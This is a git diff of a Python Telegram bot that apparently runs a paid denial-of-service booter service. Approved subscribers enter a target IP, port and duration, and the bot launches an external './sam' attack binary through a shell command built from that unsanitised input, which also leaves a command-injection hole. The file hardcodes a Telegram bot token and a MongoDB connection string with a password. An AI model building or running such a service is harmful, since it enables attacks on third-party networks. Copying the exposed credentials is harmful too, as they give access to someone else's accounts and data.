@@ -1,16 +1,27 @@
 import os
 import telebot
 import logging
+import time
 from pymongo import MongoClient
 from datetime import datetime, timedelta
 import subprocess
+import random
+from threading import Thread
+import asyncio
+import aiohttp
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+
+loop = asyncio.get_event_loop()
 
 # Telegram bot token and MongoDB URI
 TOKEN = '7889670543:AAE2CpKPg_CsbkmmAB3Wrk4434JmHofZVNM'
 MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
+FORWARD_CHANNEL_ID = 1002292224661
 CHANNEL_ID = 1002292224661
 ERROR_CHANNEL_ID = 1002292224661
+
+# Admin ID (add your admin Telegram user ID here)
+ADMIN_ID = 6207079474  # Replace with the actual admin's Telegram user ID
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -19,16 +30,15 @@ db = client['soul']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
 
 # Blocked ports list
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-# Admin IDs (this list can be modified to include multiple admin IDs)
-admin_ids = [6207079474]  # Replace this with the actual admin's user ID(s)
-
-# Function to check if user is an admin
-def is_user_admin(user_id):
-    return user_id in admin_ids
+# Function to check if user is admin
+def is_user_admin(user_id, chat_id):
+    # Check if the user is the admin based on the ADMIN_ID
+    return user_id == ADMIN_ID
 
 # Admin command to approve/disapprove user
 @bot.message_handler(commands=['approve', 'disapprove'])
@@ -36,63 +46,40 @@ def approve_or_disapprove_user(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
 
-    # Check if the user is an admin
-    if not is_user_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to use this command please contact to admin @samy784.*", parse_mode='Markdown')
+    # Only allow the admin to use this command
+    if not is_user_admin(user_id, chat_id):
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
 
-    if len(cmd_parts) < 4:
-        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
         return
 
-    try:
-        target_user_id = int(cmd_parts[1])
-        plan = int(cmd_parts[2])
-        days = int(cmd_parts[3])
-    except ValueError:
-        bot.send_message(chat_id, "*Invalid input. Please make sure user_id, plan, and days are numbers.*", parse_mode='Markdown')
-        return
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
-    # Calculate the expiration date
-    valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
-
-    if message.text.startswith('/approve'):
-        # Update the user's plan and validity in the database
+    if action == '/approve':
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
         users_collection.update_one(
             {"user_id": target_user_id},
             {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
             upsert=True
         )
-        # Send confirmation message to the admin
-        admin_msg = f"*User {target_user_id} has been approved with Plan {plan} for {days} day(s).*"
-        bot.send_message(chat_id, admin_msg, parse_mode='Markdown')
-
-        # Send message to the approved user
-        user_msg = f"Hello! You have been approved with Plan {plan} for {days} day(s). Your access is valid until {valid_until}.\n\nEnjoy your time!"
-        try:
-            bot.send_message(target_user_id, user_msg, parse_mode='Markdown')
-        except Exception as e:
-            bot.send_message(chat_id, f"Failed to notify user {target_user_id}: {e}")
-    
-    elif message.text.startswith('/disapprove'):
-        # Remove or disapprove the user (reset their plan and validity)
+        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
+    else:  # disapprove
         users_collection.update_one(
             {"user_id": target_user_id},
             {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
             upsert=True
         )
-        # Send confirmation message to the admin
-        admin_msg = f"*User {target_user_id} has been disapproved and reverted to free access.*"
-        bot.send_message(chat_id, admin_msg, parse_mode='Markdown')
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
 
-        # Send message to the disapproved user
-        user_msg = f"Your access has been revoked. You are now reverted to free access. Please contact the admin for further details @samy784."
-        try:
-            bot.send_message(target_user_id, user_msg, parse_mode='Markdown')
-        except Exception as e:
-            bot.send_message(chat_id, f"Failed to notify user {target_user_id}: {e}")
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
 
 # Handle attack command
 @bot.message_handler(commands=['attack'])
@@ -103,7 +90,7 @@ def attack_command(message):
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator @samy784.")
+            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
@@ -111,7 +98,7 @@ def attack_command(message):
             return
 
         if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "Your VIP Plan 💥 is currently not available due to limit reached.")
+            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
             return
 
         bot.send_message(chat_id, "Enter the target IP, port, and duration (in minutes) separated by spaces.")
@@ -133,64 +120,51 @@ def process_attack_command(message):
             bot.send_message(message.chat.id, f"Port {target_port} is blocked. Please use a different port.")
             return
 
-        # Fixed expiration time
-        expiration_time = "2025-10-22 23:59:59"
-
-        # Log the expiration time and other details
-        bot.send_message(message.chat.id, f"Attack started on {target_ip}:{target_port} for {duration_minutes} minutes.\nExpiration time set to {expiration_time}.")
-
-        # Construct the command to run the C program (sam) with the target IP, port, and duration
-        command = f"./sam {target_ip} {target_port} {duration_minutes}"
-        
         # Execute the C program using subprocess
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Wait for the process to complete and capture the output and errors
-        stdout, stderr = process.communicate()
+        expiration_time = "2025-10-22 23:59:59"  # Fixed expiration time
+        command = f"./sam {target_ip} {target_port} {duration_minutes}"
 
-        if process.returncode == 0:
-            # If the process was successful, inform the user
-            bot.send_message(message.chat.id, f"Attack on {target_ip}:{target_port} for {duration_minutes} minutes has completed successfully.")
-        else:
-            # If there was an error executing the command, notify the user
-            error_message = stderr.decode('utf-8')
-            bot.send_message(message.chat.id, f"Error occurred while executing the attack: {error_message}")
+        # Start the C program
+        subprocess.Popen(command, shell=True)
 
-    except ValueError as ve:
-        logging.error(f"ValueError in attack command: {ve}")
-        bot.send_message(message.chat.id, "Invalid input. Please ensure the IP, port, and duration are correctly formatted.")
+        bot.send_message(message.chat.id, f"Attack started on {target_ip}:{target_port} for {duration_minutes} minutes.")
     except Exception as e:
-        logging.error(f"Unexpected error in processing attack command: {e}")
-        bot.send_message(message.chat.id, "An error occurred while processing your request. Please try again later.")
+        logging.error(f"Error in processing attack command: {e}")
 
 # Welcome message with keyboard
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    
-    # Check user's plan and validity
-    user_data = users_collection.find_one({"user_id": user_id})
-    
-    if user_data and user_data.get("plan") > 0:
-        plan = user_data["plan"]
-        valid_until = user_data["valid_until"]
-        
-        # Check if the user's plan is still valid
-        if datetime.strptime(valid_until, "%Y-%m-%d") >= datetime.now():
-            # Create the reply keyboard with two buttons: VIP Plan and /attack
-            markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-            btn_vip_plan = KeyboardButton("VIP Plan 💥")  # VIP Plan button
-            btn_attack = KeyboardButton("/attack")  # /attack button
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    btn1 = KeyboardButton("Instant Plan 🧡")
+    btn2 = KeyboardButton("Instant++ Plan 💥")
+    btn3 = KeyboardButton("Channel Link ✔️")
+    btn4 = KeyboardButton("My Account 🏦")
+    btn5 = KeyboardButton("Help ❓")
+    btn6 = KeyboardButton("Contact Admin ✔️")
+    markup.add(btn2, btn3, btn6)
 
-            markup.add(btn_vip_plan, btn_attack)
+    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
 
-            bot.send_message(user_id, f"Welcome back! Your plan is {plan} and it's valid until {valid_until}.", reply_markup=markup)
-
-            # If VIP Plan 💥 selected, send a congratulatory message
-            if plan == 2:
-                bot.send_message(user_id, "Congratulations on selecting VIP Plan 💥! You now have priority access and additional features.", parse_mode="Markdown")
-        else:
-            bot.send_message(user_id, "Your plan has expired. Please contact the admin to renew your plan.")
+# Handle user interactions with buttons
+@bot.message_handler(func=lambda message: True)
+def handle_button_response(message):
+    if message.text == "Instant Plan 🧡":
+        bot.send_message(message.chat.id, "You have selected Instant Plan 🧡! Your access is being processed.")
+    elif message.text == "Instant++ Plan 💥":
+        bot.send_message(message.chat.id, "Congratulations on selecting Instant++ Plan 💥! You now have priority access and additional features please click here /attack 👈.")
+    elif message.text == "Channel Link ✔️":
+        bot.send_message(message.chat.id, "Click here to join our official channel: [Join Channel](https://t.me/l4dwale)", parse_mode="Markdown")
+    elif message.text == "My Account 🏦":
+        bot.send_message(message.chat.id, "To view your account details, please provide your user ID.")
+    elif message.text == "Help ❓":
+        bot.send_message(message.chat.id, "Need help? You can ask about plans, features, or technical assistance.")
+    elif message.text == "Contact Admin ✔️":
+        bot.send_message(message.chat.id, "You can reach our support team here: [Support Contact](@Samy784)", parse_mode="Markdown")
     else:
-        bot.send_message(user
+        bot.send_message(message.chat.id, "Sorry, I didn't understand that. Please choose an option from the menu.")
+
+# Start polling
+if __name__ == "__main__":
+    logging.info("Starting bot...")
+    bot.polling(none_stop=True)
+    
